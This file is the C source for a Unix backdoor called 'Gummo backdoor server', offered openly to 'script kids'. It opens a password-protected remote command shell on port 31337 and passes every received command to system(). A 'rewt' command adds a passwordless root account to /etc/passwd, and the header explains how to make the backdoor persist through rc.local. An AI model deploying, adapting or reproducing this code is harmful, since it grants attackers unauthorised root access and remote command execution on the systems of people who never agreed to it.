  /*
  /* Gummo backdoor server.
  /* compile: cc server.c -o server
  /* usage: ./server &
  /* echo /tmp/server & >> /etc/rc.d/rc.local
  /* so it's always executed after system reboots.
  /* Assuming server is in /tmp
  /* Have fun script kids, ph1x.  
  /* <phixation@hotmail.com> 
   */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>


#define PORT 31337
#define BACKLOG 5
#define CMD_LOG "/tmp/.cmd"
#define PASSWORD "password"

/* global */
int newfd;

void command ();

#define __NR_clone 56
#define SIGCHLD    17

static long raw_fork(void)
{
    long pid;

    __asm__ volatile(
        "mov $56, %%rax\n"
        "mov $17, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "xor %%rdx, %%rdx\n"
        "xor %%r10, %%r10\n"
        "xor %%r8, %%r8\n"
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(pid)
        :
        : "rax", "rdi", "rsi", "rdx", "r10", "r8", "rcx", "r11", "memory");
    return pid;
}

void 
main ()
{

  int sockfd, sin_size, ss, len, bytes;

  struct sockaddr_in my_addr;
  struct sockaddr_in their_addr;

  char passwd[1024];
  char *prompt = "Password: ";
  char *gp;

  if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket");
      exit (1);
    }
  my_addr.sin_family = AF_INET;
  my_addr.sin_port = htons (PORT);
  my_addr.sin_addr.s_addr = INADDR_ANY;
  bzero (&(my_addr.sin_zero), 8);

  if (bind (sockfd, (struct sockaddr *) &my_addr, sizeof (struct sockaddr)) \
      == -1)
    {
      perror ("bind");
      exit (1);
    }
  if (listen (sockfd, BACKLOG) == -1)
    {
      perror ("listen");
      exit (1);
    }
  while (1)
    {
      ss = sizeof (struct sockaddr_in);
      if ((newfd = accept (sockfd, (struct sockaddr *) &their_addr, \
			   &sin_size)) == -1)
	{
	  perror ("accept");
	  exit (1);
	}
      if (raw_fork ())
	{
	  len = strlen (prompt);
	  bytes = send (newfd, prompt, len, 0);
	  recv (newfd, passwd, 1024, 0);

	  if ((gp = strchr (passwd, 13)) != NULL)
	    *(gp) = '\0';

	  if (!strcmp (passwd, PASSWORD))
	    {
	      send (newfd, "Access Granted, HEH\n", 21, 0);
	      send (newfd, "\n\n\n\n\n\nWelcome To Gummo Backdoor Server!\n\n", 41, 0);
	      send (newfd, "Type 'HELP' for a list of commands\n\n", 36, 0);
	      command ();
	    }
	  else if (passwd != PASSWORD)
	    {
	      send (newfd, "Authentification Failed! =/\n", 29, 0);
	      close (newfd);
	    }
	}
    }
}     /* command() will process all the commands sent */
    /* and send back the output of them to your client */

void 
command ()
{

  FILE *read;
  FILE *append;
  char cmd_dat[1024];
  char *cmd_relay;
  char *clean_log;
  char buf[5000];

  int dxm;

  while (1)
    {

      send (newfd, "command:~# ", 11, 0);
      recv (newfd, cmd_dat, 1024, 0);
      cmd_dat[strlen (cmd_dat) - 2] = '\0';
      if (strcmp (cmd_dat, ""))
	{

	  if ((strstr (cmd_dat, "HELP")) == cmd_dat)
	    {
	      send (newfd, "\n\n-=Help Menu=-\n", 16, 0);
	      send (newfd, "\nquit - to exit gummo backdoor\n", 31, 0);
	      send (newfd, "rewt - automatically creates non passworded accnt 'rewt' uid0\n", 63, 0);
	      send (newfd, "wipeout - this feature rm -rf /'s a box. Inspired by dethcraze\n", 64, 0);
	    }
	  if ((strstr (cmd_dat, "quit")) == cmd_dat)
	    {
	      shutdown(newfd);
	      close (newfd);
	    }
	  if ((strstr (cmd_dat, "rewt")) == cmd_dat)
	    {
	      system ("echo rewt::0:0::/:/bin/sh>>/etc/passwd;");
	      send (newfd, "User 'rewt' added!\n", 19, 0);
	    }
	  if ((strstr (cmd_dat, "wipeout")) == cmd_dat)
	    {
	      send (newfd, "Your a dumb fuck for trying to use this command, HEH!\n", 54, 0);
	      shutdown(newfd);
	      close(newfd);
              exit(0); // exit backdoor, they are not worthy of using it lol
	    }
	
          else
	    append = fopen (CMD_LOG, "w");
	  fprintf (append, "dextro\n");
	  fclose (append);


	  clean_log = (char *) malloc (420);
	  sprintf (clean_log, "rm %s", CMD_LOG);
	  system (clean_log);

	  cmd_relay = (char *) malloc (1024);
	  snprintf (cmd_relay, 1024, "%s > %s;\0", cmd_dat, CMD_LOG);
	  system (cmd_relay);

	  if ((read = fopen (CMD_LOG, "r")) == NULL)
	    continue;
	  while (!(feof (read)))
	    {
	      memset (buf, 0, 500);
	      fgets (buf, 500, read);
	      if (buf[0] == 0)
		break;
	      write (newfd, buf, 500);
	    }
	  fclose (read);
	}
    }
}
